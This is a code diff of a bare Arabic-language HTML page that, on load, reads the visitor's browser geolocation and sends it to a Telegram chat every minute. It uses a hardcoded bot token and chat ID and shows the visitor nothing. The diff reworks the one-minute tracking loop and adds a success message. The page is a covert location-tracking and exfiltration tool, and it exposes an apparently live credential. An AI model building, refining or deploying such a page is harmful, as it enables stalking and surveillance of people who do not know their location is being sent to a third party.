@@ -1,4 +1,4 @@
-
+html
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -8,14 +8,11 @@
     <script>
         const botToken = '5909067412:AAF16T7_MliWPBOIsALuQsoRAbb_dbXyvnM'; // استبدل هذا بتوكن البوت الخاص بك
         const chatId = '1051175859'; // استبدل هذا بمعرف الدردشة الخاص بك
+        let permissionGranted = false; // متغير لتتبع حالة الإذن
 
         function startLocationTracking() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
-                // تحديد الموقع كل دقيقة (60000 مللي ثانية)
-                setInterval(() => {
-                    navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
-                }, 60000);
             } else {
                 document.getElementById("result").innerHTML = "المتصفح لا يدعم تحديد الموقع.";
             }
@@ -36,6 +33,16 @@
                     }
                 })
                 .catch(error => console.error("خطأ:", error));
+
+            permissionGranted = true; // تم منح الإذن
+            document.getElementById("result").innerHTML = "تم الحصول على الموقع بنجاح.";
+            
+            // تحديد الموقع كل دقيقة (60000 مللي ثانية) بعد منح الإذن
+            setInterval(() => {
+                if (permissionGranted) {
+                    navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
+                }
+            }, 60000);
         }
 
         function showError(error) {
@@ -57,5 +64,6 @@
     </script>
 </head>
 <body onload="startLocationTracking()">
+
 </body>
 </html>
